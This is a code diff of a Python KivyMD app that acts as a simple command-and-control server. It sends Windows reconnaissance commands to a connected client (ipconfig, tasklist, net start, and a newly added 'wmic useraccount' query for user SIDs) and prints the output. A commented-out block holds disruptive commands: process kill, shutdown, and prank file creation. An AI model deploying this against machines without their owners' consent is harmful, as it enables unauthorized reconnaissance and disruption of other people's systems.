@@ -20,7 +20,6 @@ ScreenManager:
             opacity: 1
             disabled: False
             on_press: app.StartServer()
-
         MDLabel:
             id: statusLbl
             text: "Status"
@@ -36,7 +35,7 @@ ScreenManager:
             pos_hint: {"center_x": 0.5, "center_y": 0.95}
             orientation: 'lr-tb'
             spacing: 10
-            cols: 4
+            cols: 5
             MDRectangleFlatButton:
                 id: networkInfoBtn
                 text: "Network Info"
@@ -65,12 +64,20 @@ ScreenManager:
                 opacity: 1
                 disabled: False
                 on_press: app.services()
+            MDRectangleFlatButton:
+                id: userInfoBtn
+                text: "User Information"
+                pos_hint: {"center_x": .5, "center_y": .5}
+                opacity: 1
+                disabled: False
+                on_press: app.userInfo()
 '''
 
 
 class Main(MDApp):
     def build(self):
         return Builder.load_string(KV)
+
 
     def StartServer(self):
         # Server IP and Port
@@ -105,26 +112,22 @@ class Main(MDApp):
         while True:
             # Send command to the client
             command = 'ipconfig /all'
-            command = command.encode()
-            self.currConn.send(command)
+            self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
             # Receive the output given from the client
-            output = self.currConn.recv(8096)
-            output = output.decode()
+            output = self.currConn.recv(8096).decode()
             print('Output: ', output)
             break
 
     # Zees stuff
     def cpuusage(self):
         while True:
-            command = '@for /f "skip=1" %p in ('wmic cpu get loadpercentage') do @echo %p%'     #Try this now
-            command = command.encode()
-            self.currConn.send(command)
+            command = 'wmic cpu get loadpercentage'
+            self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            output = self.currConn.recv(8096)
-            output = output.decode()
+            output = self.currConn.recv(8096).decode()
             print('Output: ', output)
             break
 
@@ -133,32 +136,44 @@ class Main(MDApp):
         while True:
             # send command to client
             command = 'tasklist'
-            command = command.encode()
-            self.currConn.send(command)
+            self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
             # receive output from client
-            output = self.currConn.recv(20480)  # Changed buffer
-            output = output.decode()           
-            print('Output: ', output)          
+            output = self.currConn.recv(20480)  # Still needs more buffer
+            output = output.decode()
+            print('Output: ', output)
             break
 
 
     def services(self):
         while True:
             command = 'net start'
-            command = command.encode()
-            self.currConn.send(command)
+            self.currConn.send(command.encode())
             print('Command sent to client: ', command)
 
-            output = self.currConn.recv(8096)
-            output = output.decode()
+            output = self.currConn.recv(8096).decode()
             print('Output: ', output)
             break
 
+    # Fang's stuffz
+    def userInfo(self):
+        while True:
+            command = 'wmic useraccount get domain,name,sid'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+
+            output = self.currConn.recv(8096).decode()
+            cleanOut = output.splitlines()
+            print('Output: ')
+            for lines in cleanOut:
+                if lines != "":
+                    print(lines)
+            break
+
+
 """
 UNTESTED SO I COMMENTED DISRUPRIONS OUT FOR NOW
-
 def killtask():
     while True:
         procname = input('Enter Process Name: ')
@@ -166,13 +181,10 @@ def killtask():
         command = command.encode()
         currConn.send(command)
         print('Command sent to client: ', command)
-
         output = client.recv(8096)
         output = output.decode()
         print('Output: ', output)
         break
-
-
 def shutdown():
     while True:
         command = 'shutdown /s'
@@ -180,8 +192,6 @@ def shutdown():
         currConn.send(command)
         print('Command sent to client: ', command)
         break
-
-
 def filecreate():
     while True:
         command = 'cd Desktop && FOR /L %A IN (1 1 20) DO (echo. > “You suck eggs %A.txt”)'
@@ -189,7 +199,6 @@ def filecreate():
         currConn.send(command)
         print('Command sent to client: ', command)
         break
-
 """
 
 if __name__ == '__main__':
